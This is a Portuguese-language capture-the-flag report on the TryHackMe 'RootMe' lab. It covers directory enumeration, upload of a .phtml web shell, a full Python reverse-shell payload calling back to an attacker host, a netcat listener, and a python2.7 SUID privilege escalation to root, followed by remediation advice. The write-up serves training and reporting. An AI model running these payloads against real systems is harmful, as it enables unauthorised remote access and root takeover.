
# 1 — Visão geral da metodologia

1. **Objetivo:** evidenciar exploração reprodutível, impacto e recomendações acionáveis.
    
2. **Estrutura:** Recon → Enumeração → Exploração → Shell → Privesc → Flags → Reporting.
    
3. **Princípios:** documentação completa de comandos e resultados.
    

---

# Report — Máquina: `RootMe` — `10.65.158.29`

- **Fonte:** THM
    
- **Data:** `2025-11-28`
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 16:53
    
- **Tempo gasto:** _1h 15min_
    

---

## 1) Executive summary

Upload de arquivo malicioso no `panel` permitiu execução remota de comandos; pós-exploração revelou **python2.7 com SUID**, possibilitando **root instantâneo**. Flags coletadas garantindo controle total do host.

---

## 2) Escopo e limitações

- **Alvo:** `10.65.158.29`
    
- **Serviços expostos:** HTTP, SSH
    
- **Ferramentas utilizadas:** Nmap, Gobuster, Netcat, Python SUID
    
- **Limitações:** nenhuma indicada pelo lab
    

---

## 3) Metodologia aplicada

- Recon: TCP scan + fingerprint
    
- Enumeração web: descoberta de upload em `/panel`
    
- Exploração: Upload de `.phtml` e execução remota de comandos
    
- Shell reversa via Python3
    
- Pós-exploração: enumeração SUID + Privesc via Python2.7
    
- Flags coletadas
    

---

## 4) Achado principal

**Vulnerabilidade:** Upload não sanitizado + Execução Remota de Código  
**Local:** `/panel` + diretório `/uploads`  
**PoC (comando executado):**

`http://10.65.158.29/uploads/shell.phtml?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.144.248",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'`

**Artefatos obtidos:** Flag de user e Flag root

---

## 5) Evidências / PoC (resumo)

**Scan inicial**

`sudo nmap -sS -sV -T4 -O 10.65.158.29 -oN ~/Desktop/RootMe.txt`

**Enumeração de diretórios**

`gobuster dir -u http://10.65.158.29/ -w /usr/share/wordlists/dirb/common.txt`

→ Descoberto `/panel` (upload habilitado)

**Shell reversa no atacante**

`nc -lvnp 4444`

**Flag1**

- `/var/www/html/` (usuário www-data)
    

---

## 6) Impacto & Severidade

**Severidade:** **Alta**

**Justificativa:**  
Execução remota sem autenticação + binário SUID crítico ⇒ corrupção total do sistema, root garantido, pivoteamento possível.

---

## 7) Reproduzir (passo-a-passo)

1. Scan recon:
    

`sudo nmap -sS -sV -T4 -O 10.65.158.29 -oN RootMe.txt`

2. Localizar painel:
    

`gobuster dir -u http://10.65.158.29/ -w common.txt`

3. Upload de `.phtml` no `/panel`
    
4. Configurar listener no atacante:
    

`nc -lvnp 4444`

5. Executar payload via parâmetro `cmd`:
    

`http://<IP>/uploads/shell.phtml?cmd=<reverse_python_payload>`

6. Enumerar SUID:
    

`find / -perm -4000 -type f 2>/dev/null`

7. Escalonar privilégios:
    

`/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

→ root  
8. Coletar flags → `/root`

---

## 8) Recomendações (gestores)

- Corrigir falha de upload (restrição de extensões e MIME)
    
- Remover permissões SUID de binários desnecessários
    
- Reforçar hardening do Apache e validação no backend
    

---

## 9) Recomendações técnicas (passo-a-passo)

- Sanitizar uploads + executar em diretórios sem permissão de execução
    
- Remover SUID do Python2.7:
    

`chmod -s /usr/bin/python2.7`

- Filtrar parâmetros GET para evitar RCE
    
- Logging + WAF com regras para uploads e comandos
---

## 10) Apêndice técnico

### Nmap

Arquivo: `RootMe.txt` 

![](RootMe.txt)
### GoBuster

Arquivo: `gobuster_results_RootMe.txt` 

![](gobuster_results_RootMe.txt)
### Payload usado

- Reverse shell Python3 via parâmetros de URL
### Flags

- **User Flag:** `/var/www`
    
- **Root Flag:** `/root`
---

## 11) Lições aprendidas / Follow-up

- Upload exploitation continua sendo um vetor crítico
    
- Binários SUID devem ser monitorados regularmente
    
- Atualizações de segurança importantes (Python2.7 EOL)
